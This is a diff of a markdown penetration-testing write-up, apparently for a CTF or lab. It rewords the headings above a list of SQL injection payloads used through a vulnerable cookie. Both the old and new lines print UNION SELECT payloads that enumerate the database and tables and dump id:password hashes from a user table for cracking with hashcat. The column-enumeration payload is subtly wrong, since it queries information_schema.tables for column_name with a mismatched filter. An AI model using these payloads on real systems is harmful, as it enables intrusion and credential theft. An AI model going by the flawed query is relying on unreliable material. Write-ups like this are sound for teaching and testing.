@@ -14,13 +14,13 @@ The cookie turned out to be vulnerable to SQL injection (SQLi). I found Portswig
 ![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FsixO74ZQmWWjbatdV7WQ%2Fuploads%2FiMA8il58YnoiSfSBNhwv%2FBURPCOOKIESQL.jpg?alt=media&token=ca2f7673-855a-4e73-9e13-626d989795d6)
 
 ### SQLi payloads:
-##### Find current database:
+##### Determine the current database:
 #### `' UNION SELECT 1,database(),3 -- -`
-##### Get tables in checkout database:
+##### Retrieve tables in the checkout database:
 #### `'UNION SELECT 1,group_concat(table_name),3 from information_schema.tables WHERE table_schema='checkout' -- -`
-##### Enumerate columns in user table from the checkout database:
+##### Enumerate columns in the user table from the checkout database:
 #### `' UNION SELECT 1,group_concat(column_name),3 from information_schema.tables WHERE table_schema='user' -- -`
-##### Get values from the user table:
+##### Obtain values from the user table:
 #### `' UNION SELECT 1,group_concat(id, ':', password),3 from checkout.user -- -`
 
 ##### Eventually, a hash is obtained that can be cracked using hashcat.
